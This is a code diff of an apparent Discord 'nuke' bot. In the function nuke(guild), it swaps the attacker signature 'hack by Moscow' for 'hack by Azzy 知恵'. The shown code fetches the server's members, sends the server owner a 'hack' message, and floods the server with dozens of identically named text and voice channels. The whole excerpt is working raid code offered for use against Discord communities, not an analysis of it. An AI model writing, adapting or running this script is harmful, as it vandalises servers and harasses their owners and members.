@@ -399,7 +399,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hack by Moscow : ⚠').catch(e => { return void e; });
+  await guild.owner.send(' hack by Azzy 知恵 : ⚠').catch(e => { return void e; });
  
  
  
@@ -418,60 +418,60 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('hack by Moscow', 'text');
+    await guild.createChannel('hack by Azzy 知恵', 'text');
  
-      await guild.createChannel('hack by Moscow', 'voice');
- await guild.createChannel('hack by Moscow', 'text');
+      await guild.createChannel('hack by Azzy 知恵', 'voice');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
  
- await guild.createChannel('hack by Moscow', 'text');
-  await guild.createChannel('hack by Moscow', 'text');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
+  await guild.createChannel('hack by Azzy 知恵', 'text');
  
-      await guild.createChannel('hack by Moscow', 'voice');
- await guild.createChannel('hack by Moscow', 'text');
+      await guild.createChannel('hack by Azzy 知恵', 'voice');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
  
- await guild.createChannel('hack by Moscow', 'text');
-  await guild.createChannel('hack by Moscow', 'text');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
+  await guild.createChannel('hack by Azzy 知恵', 'text');
  
-      await guild.createChannel('hack by Moscow', 'voice');
- await guild.createChannel('hack by Moscow', 'text');
+      await guild.createChannel('hack by Azzy 知恵', 'voice');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
  
- await guild.createChannel('hack by Moscow', 'text');
-  await guild.createChannel('hack by Moscow', 'text');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
+  await guild.createChannel('hack by Azzy 知恵', 'text');
  
-      await guild.createChannel('hack by Moscow', 'voice');
- await guild.createChannel('hack by Moscow', 'text');
+      await guild.createChannel('hack by Azzy 知恵', 'voice');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
  
- await guild.createChannel('hack by Moscow', 'text');
-  await guild.createChannel('hack by Moscow', 'text');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
+  await guild.createChannel('hack by Azzy 知恵', 'text');
  
-      await guild.createChannel('hack by Moscow', 'voice');
- await guild.createChannel('hack by Moscow', 'text');
+      await guild.createChannel('hack by Azzy 知恵', 'voice');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
  
- await guild.createChannel('hack by Moscow', 'text');
-  await guild.createChannel('hack by Moscow', 'text');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
+  await guild.createChannel('hack by Azzy 知恵', 'text');
  
-      await guild.createChannel('hack by Moscow', 'voice');
- await guild.createChannel('hack by Moscow', 'text');
+      await guild.createChannel('hack by Azzy 知恵', 'voice');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
  
- await guild.createChannel('hack by Moscow', 'text');
-  await guild.createChannel('hack by Moscow', 'text');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
+  await guild.createChannel('hack by Azzy 知恵', 'text');
  
-      await guild.createChannel('hack by Moscow', 'voice');
- await guild.createChannel('hack by Moscow', 'text');
+      await guild.createChannel('hack by Azzy 知恵', 'voice');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
  
- await guild.createChannel('hack by Moscow', 'text');
-  await guild.createChannel('hack by Moscow', 'text');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
+  await guild.createChannel('hack by Azzy 知恵', 'text');
  
-      await guild.createChannel('hack by Moscow', 'voice');
- await guild.createChannel('hack by Moscow', 'text');
+      await guild.createChannel('hack by Azzy 知恵', 'voice');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
  
- await guild.createChannel('hack by Moscow', 'text');
-  await guild.createChannel('hack by Moscow', 'text');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
+  await guild.createChannel('hack by Azzy 知恵', 'text');
  
-      await guild.createChannel('hack by Moscow', 'voice');
- await guild.createChannel('hack by Moscow', 'text');
+      await guild.createChannel('hack by Azzy 知恵', 'voice');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
  
- await guild.createChannel('hack by Moscow', 'text');
+ await guild.createChannel('hack by Azzy 知恵', 'text');
 }
  
 LOka.on('ready', () => {
